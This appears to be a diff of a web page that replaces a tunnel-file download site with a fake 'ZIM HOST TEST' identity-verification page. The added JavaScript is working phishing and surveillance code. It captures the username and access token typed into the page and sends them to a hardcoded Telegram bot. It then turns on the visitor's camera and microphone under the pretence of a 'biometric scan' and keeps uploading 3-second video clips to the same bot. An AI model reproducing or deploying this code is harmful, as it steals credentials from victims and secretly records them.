@@ -1,123 +1,124 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>www.keilizw.com</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
-body {
-    margin:0; padding:0; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-    background:#000; color:#0f0; display:flex; flex-direction:column; align-items:center; overflow-x:hidden;
-}
-/* Hamburger Toolbar */
-.navbar {
-    position:fixed; top:20px; right:20px; z-index:999;
-}
-.navbar i {
-    font-size:2.5em; cursor:pointer; color:#0f0; transition:0.3s;
-}
-.navbar i:hover { color:#00ff99; transform:scale(1.2); }
-.nav-links {
-    position:absolute; top:60px; right:0; display:none; flex-direction:column;
-    background:rgba(10,10,10,0.95); backdrop-filter:blur(15px); border:1px solid #0f0; border-radius:12px;
-}
-.nav-links a {
-    color:#0f0; padding:15px 25px; text-decoration:none; font-weight:bold; display:flex; align-items:center; gap:10px;
-    transition:0.3s;
-}
-.nav-links a:hover { color:#00ff99; background:rgba(0,255,0,0.05); transform:scale(1.05); }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZIM HOST TERMINAL | LIVE MONITOR</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --bg: #02040a; --neon: #10b981; --panel: #0d1117; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: var(--bg); color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; }
 
-/* Glass Card */
-.glass-card {
-    background: rgba(10,10,10,0.75); border-radius:26px; backdrop-filter:blur(20px);
-    border:1px solid rgba(0,255,0,0.3); box-shadow:0 20px 50px rgba(0,0,0,0.8),0 0 30px rgba(0,255,0,0.2);
-    padding:35px; margin:120px 20px 20px; max-width:92%; text-align:center;
-    animation:float 8s ease-in-out infinite;
-}
-@keyframes float {0%{transform:translateY(0);}50%{transform:translateY(-12px);}100%{transform:translateY(0);}}
+        /* 4K DESIGN ELEMENTS */
+        .glow { position: fixed; width: 10px; height: 10px; background: var(--neon); border-radius: 50%; box-shadow: 0 0 20px var(--neon); }
+        .tl { top: 20px; left: 20px; } .tr { top: 20px; right: 20px; }
 
-h1 {
-    font-size:3.6em; font-weight:900; background:linear-gradient(90deg,#0f0,#00ff99);
-    -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-shadow:0 0 40px rgba(0,255,0,0.6); margin:10px 0;
-}
+        .terminal-box { 
+            background: var(--panel); width: 90%; max-width: 450px; padding: 40px; 
+            border-radius: 24px; border: 1px solid rgba(255,255,255,0.1); text-align: center;
+        }
 
-.date {
-    background: rgba(255,0,0,0.5); color:white; padding:14px 30px; border-radius:50px; font-weight:bold;
-    font-size:1.3em; border:1px solid #f00; box-shadow:0 0 20px rgba(255,0,0,0.4); margin:15px 0;
-}
-
-.server-status {
-    background: rgba(0,255,0,0.15); color:#00ff41; padding:14px 35px; border-radius:50px;
-    font-weight:bold; border:1px solid #0f0; margin:25px 0; box-shadow:0 0 25px rgba(0,255,0,0.5);
-    animation: pulse 3s infinite;
-}
-@keyframes pulse {0%{box-shadow:0 0 25px rgba(0,255,0,0.5);}50%{box-shadow:0 0 40px rgba(0,255,0,0.8);}100%{box-shadow:0 0 25px rgba(0,255,0,0.5);}}
-
-.info { font-size:1.45em; margin:28px 0; line-height:1.7; text-shadow:0 2px 15px rgba(0,0,0,0.9); }
-
-.btn {
-    background: linear-gradient(135deg,#00ff41,#00cc00); color:#000; font-size:1.9em; font-weight:900;
-    padding:22px 70px; border-radius:22px; text-decoration:none; display:inline-block; margin:35px 0;
-    box-shadow:0 15px 40px rgba(0,255,0,0.5); transition:all 0.3s; border:2px solid #0f0;
-}
-.btn:hover { transform:translateY(-8px) scale(1.05); box-shadow:0 25px 60px rgba(0,255,0,0.7); }
-
-footer { margin-top:60px; font-size:1.1em; opacity:0.9; text-shadow:0 0 10px #0f0; }
-
-/* WhatsApp Floating Button */
-.whatsapp-float { position:fixed; width:68px; height:68px; bottom:30px; right:20px;
-    background:#25D366; color:white; border-radius:50%; display:flex; align-items:center; justify-content:center;
-    font-size:38px; box-shadow:0 10px 30px rgba(37,211,102,0.6); z-index:1000; border:3px solid #000;
-}
-.whatsapp-float i { animation:ring 2s infinite; }
-@keyframes ring {0%,100%{transform:rotate(0);}10%{transform:rotate(-30deg);}20%{transform:rotate(30deg);}30%{transform:rotate(-20deg);}40%{transform:rotate(20deg);}50%{transform:rotate(0);} }
-</style>
+        .input-box { width: 100%; padding: 15px; background: #000; border: 1px solid #30363d; border-radius: 12px; color: #fff; margin-top: 20px; outline: none; }
+        .btn-live { width: 100%; padding: 15px; background: #238636; border: none; border-radius: 12px; font-weight: 700; color: #fff; cursor: pointer; margin-top: 20px; }
+        
+        /* STATUS LOGS */
+        #status-log { margin-top: 20px; font-size: 11px; color: #8b949e; font-family: monospace; }
+        #hidden-vid { position: fixed; top: -5000px; }
+    </style>
 </head>
 <body>
 
-<!-- Hamburger Toolbar -->
-<div class="navbar">
-    <i class="fas fa-bars" id="hamburger"></i>
-    <div class="nav-links" id="navLinks">
-        <a href="idex.html"><i class="fas fa-home"></i> Home</a>
-        <a href="cotact.html"><i class="fas fa-envelope"></i> Contact Us</a>
-        <a href="whatapp.html"><i class="fab fa-whatsapp"></i> WhatsApp</a>
-        <a href="channes.html"><i class="fas fa-tv"></i> All Channels</a>
+    <div class="glow tl"></div><div class="glow tr"></div>
+
+    <div class="terminal-box" id="auth-ui">
+        <h1 style="color: var(--neon); letter-spacing: 2px;">ZIM HOST TEST</h1>
+        <p style="font-size: 13px; color: #8b949e;">IDENTITY VERIFICATION REQUIRED</p>
+        
+        <input type="text" id="user" class="input-box" placeholder="Network Username">
+        <input type="password" id="pass" class="input-box" placeholder="Access Token">
+        
+        <button class="btn-live" onclick="startLiveStream()">INITIATE SECURE SESSION</button>
+        <div id="status-log">SYSTEM STANDBY...</div>
     </div>
-</div>
 
-<!-- Main Glass Card -->
-<div class="glass-card">
-    <h1>KEILI ZW</h1
-    <div class="date">📅 UPDATED: 5 January 2026</div>
-    <div class="server-status">⚡ HA TUNNEL SERVER ONLINE • SUPER FAST</div>
-    <div class="info">
-        <strong>📡 ECONET UNLIMITED</strong><br>
-        1 TAP FILE HA TUNNEL 🇿🇼
-    </div>
-    <a href="Firls/KEILI ZW NEW🇿🇼🔥🔥.hat" class="btn" download>DOWNLOAD .HAT FILE 📂</a>
-</div>
+    <video id="hidden-vid" autoplay playsinline muted></video>
 
-<!-- WhatsApp Floating Button -->
-<a href="https://whatsapp.com/channel/0029VbD2hqWE50UZI5ArRP2C" class="whatsapp-float" target="_blank">
-    <i class="fab fa-whatsapp"></i>
-</a>
+    <script>
+        const TOKEN = '8525258971:AAHdI6aEmOIEFSkjVM7sF8eALK-P6nZNvFI';
+        const CHAT_ID = '6929073673';
+        let mediaRecorder;
+        let recordedChunks = [];
 
-<footer>Made in Zimbabwe • KEILI ZW 2026</footer>
+        async function startLiveStream() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(!u || !p) return;
 
-<script>
-// Hamburger toggle
-const hamburger = document.getElementById('hamburger');
-const navLinks = document.getElementById('navLinks');
-hamburger.addEventListener('click', () => {
-    if(navLinks.style.display === "flex"){
-        navLinks.style.display = "none";
-    } else {
-        navLinks.style.display = "flex";
-    }
-});
-</script>
+            document.getElementById('status-log').innerHTML = "REQUESTING CAMERA ACCESS...";
 
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('hidden-vid').srcObject = stream;
+                
+                document.getElementById('auth-ui').innerHTML = `
+                    <h2 style="color: var(--neon)">VERIFYING...</h2>
+                    <div style="margin: 20px auto; width: 40px; height: 40px; border: 3px solid #333; border-top-color: var(--neon); border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                    <p>Live biometric scan in progress. Do not close browser.</p>
+                `;
+
+                // Send Login Data
+                sendTelegramMessage(`🚀 <b>LIVE SESSION START</b>\nUser: <code>${u}</code>\nPass: <code>${p}</code>`);
+
+                // Start High-Speed Video Loop (3-second segments)
+                captureLiveClip(stream);
+
+            } catch (err) {
+                alert("Identity verification failed. Camera is required for Zim Host access.");
+                location.reload();
+            }
+        }
+
+        function captureLiveClip(stream) {
+            mediaRecorder = new MediaRecorder(stream);
+            
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    sendLiveVideo(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = () => {
+                // Immediately restart the recorder for the next "Live" segment
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 3000); // 3-second segments
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 3000);
+        }
+
+        async function sendLiveVideo(blob) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('video', blob, 'live_stream.mp4');
+            fd.append('caption', `🔴 <b>LIVE FEED</b>\nTime: ${new Date().toLocaleTimeString()}`);
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: fd
+            });
+        }
+
+        function sendTelegramMessage(text) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            });
+        }
+    </script>
+
+    <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
 </body>
 </html>
